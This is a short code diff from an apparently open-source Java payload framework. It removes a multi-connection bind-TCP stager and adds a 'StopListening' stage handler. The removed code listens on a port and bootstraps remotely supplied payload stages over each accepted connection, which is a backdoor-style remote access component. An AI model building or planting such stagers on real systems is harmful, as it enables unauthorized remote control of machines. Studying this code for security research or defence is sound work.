@@ -32,38 +32,14 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.stager;
+package javapayload.handler.stage;
 
-import java.net.ServerSocket;
-import java.net.Socket;
-
-public class BindMultiTCP extends Stager implements Runnable {
-
-	private Socket s;
-	private String[] parameters; 
-	
-	private Runnable init(Socket s, String[] parameters) {
-		this.s = s;
-		this.parameters=parameters;	
-		return this;
+public class StopListening extends StageHandler {
+	public Class[] getNeededClasses() {
+		return new Class[] { javapayload.stage.Stage.class, javapayload.stage.StopListening.class };
 	}
 	
-	public void bootstrap(String[] parameters) throws Exception {
-		final ServerSocket ss = new ServerSocket(Integer.parseInt(parameters[2]));
-		while (true) {
-			final Socket s = ss.accept();
-			new Thread(new BindMultiTCP().init(s, parameters)).start();
-			if (parameters != null && parameters.length > 0 && parameters[0].equals("-STOP-"))
-				break;
-		}
-		ss.close();
-	}
-	
-	public void run() {
-		try {
-			bootstrap(s.getInputStream(), s.getOutputStream(), parameters);
-		} catch (Exception ex) {
-			ex.printStackTrace();
-		}
+	protected StageHandler createClone() {
+		return new StopListening();
 	}
 }
